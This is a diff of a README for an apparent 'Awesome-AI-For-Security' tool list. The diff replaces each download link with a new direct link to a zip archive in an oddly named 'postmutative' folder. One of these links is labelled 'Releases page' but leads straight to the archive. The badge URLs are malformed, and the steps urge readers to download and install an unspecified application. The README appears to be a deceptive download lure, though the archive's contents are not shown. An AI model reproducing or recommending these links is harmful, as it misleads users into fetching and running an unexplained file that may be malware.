@@ -1,6 +1,6 @@
 # 🤖 Awesome-AI-For-Security - Enhance Cybersecurity with AI Tools
 
-[![Download Now](https://raw.githubusercontent.com/mikehubers/Awesome-AI-For-Security/main/postmutative/Awesome-AI-For-Security.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/mikehubers/Awesome-AI-For-Security/main/postmutative/Awesome-AI-For-Security.zip)
+[![Download Now](https://github.com/mikehubers/Awesome-AI-For-Security/raw/refs/heads/main/postmutative/Awesome_A_Security_For_v1.5.zip%20Now-Click%20Here-blue)](https://github.com/mikehubers/Awesome-AI-For-Security/raw/refs/heads/main/postmutative/Awesome_A_Security_For_v1.5.zip)
 
 ## 📄 Overview
 
@@ -11,7 +11,7 @@ Welcome to **Awesome-AI-For-Security**. This repository offers a curated list of
 To use the tools available in this repository, follow these simple steps:
 
 1. **Visit the Releases Page**
-   - Open your web browser and navigate to our [Releases page](https://raw.githubusercontent.com/mikehubers/Awesome-AI-For-Security/main/postmutative/Awesome-AI-For-Security.zip). 
+   - Open your web browser and navigate to our [Releases page](https://github.com/mikehubers/Awesome-AI-For-Security/raw/refs/heads/main/postmutative/Awesome_A_Security_For_v1.5.zip). 
 
 2. **Select the Version You Need**
    - On the Releases page, you will see various versions of our application. Each version may contain different features or fixes.
@@ -28,7 +28,7 @@ To use the tools available in this repository, follow these simple steps:
 
 To download Awesome-AI-For-Security, click the button below:
 
-[![Download Now](https://raw.githubusercontent.com/mikehubers/Awesome-AI-For-Security/main/postmutative/Awesome-AI-For-Security.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/mikehubers/Awesome-AI-For-Security/main/postmutative/Awesome-AI-For-Security.zip)
+[![Download Now](https://github.com/mikehubers/Awesome-AI-For-Security/raw/refs/heads/main/postmutative/Awesome_A_Security_For_v1.5.zip%20Now-Click%20Here-blue)](https://github.com/mikehubers/Awesome-AI-For-Security/raw/refs/heads/main/postmutative/Awesome_A_Security_For_v1.5.zip)
 
 ### 💻 System Requirements
 
